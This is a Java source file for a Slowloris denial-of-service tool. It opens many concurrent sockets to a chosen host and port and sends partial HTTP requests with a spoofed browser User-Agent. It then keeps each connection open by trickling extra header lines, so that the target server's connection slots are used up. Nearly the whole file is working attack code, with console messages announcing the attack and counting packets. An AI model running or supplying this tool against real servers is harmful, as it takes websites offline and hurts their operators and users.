import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Random;

public class SlowLoris extends Thread{
    private boolean stop;
    private String host;
    private String method = "GET";
    private int port;
    private int timeout;
    private int tcpTimeout = 5 * 1000;
    private int connections;
    private int threads = 50;
    private Random random = new Random();
    static int failed = 0, packets = 0, active = 0;
    static int threadNr = 0;

    private String malformedRequest = "GET / HTTP/1.1\r\n"
            + "Host: " + host + "\r\n"
            + "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
            + "Content-Length: 42\r\n";

    public SlowLoris(String host, int port, int timeout, int conn){
        super(Integer.toString(++threadNr));
        this.stop = false;
        this.host = host;
        this.port = port;
        this.timeout = timeout;
        this.connections = conn;
        //	this.cache = cache;
    }

    public void run() {
        System.out.println("Attack started on thread " + Thread.currentThread().getId());
        boolean[] w = new boolean[connections];
        Socket[] s = new Socket[connections];

        while (!stop) {
            System.out.println("Building Sockets...");
            try {
                for (int i = 0; i < connections; i++) {
                    if (!w[i]) {
                        s[i] = new Socket();
                        InetAddress address = InetAddress.getByName(host);
                        s[i].connect(new InetSocketAddress(address.getHostAddress(), port), tcpTimeout);
                        w[i] = true;
                        PrintWriter out = new PrintWriter(s[i].getOutputStream());
                        String rand = "";
                        // rand = "?" + (random.nextInt(999999999));

                        // RSnake's malformed HTTP request
                        String request = method + " /" + rand + " HTTP/1.1\r\n"
                                + "Host: " + host + "\r\n"
                                + "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                                + "Content-Length: 42\r\n";
                        out.print(request);
                        out.flush();
                        packets += 3;
                        ++active;
                    }
                }

                System.out.println("Sending Data...");
                for (int i = 0; i < connections; i++) {
                    if (w[i]) {
                        PrintWriter out = new PrintWriter(s[i].getOutputStream());
                        out.print("X-a: b\r\n");    // keeps the connection alive; server waits like a 'loh' for new requests
                        out.flush();
                        ++packets;
                        ++active;
                    } else {
                        w[i] = false;
                        ++failed;
                        --active;
                    }
                }

                System.out.println("Packets sent: " + packets);
                System.out.println("Packets failed: " + failed);
                System.out.println("Active connections: " + active);
                Thread.sleep(timeout);

                if(stop) { System.out.println("kjasnfkjsnadfkj---------"); break; }


            } catch (Exception e) {
                ++failed;
                --active;
            }
        }

        for(Socket sock : s){
            try {
                sock.close();
            } catch (IOException e) { e.printStackTrace(); }
            catch (NullPointerException ne){ ne.printStackTrace(); }
        }
        System.out.println("All sockets have been closed!");
    }

    synchronized void stopAttack() {
        stop = true;
    }

}
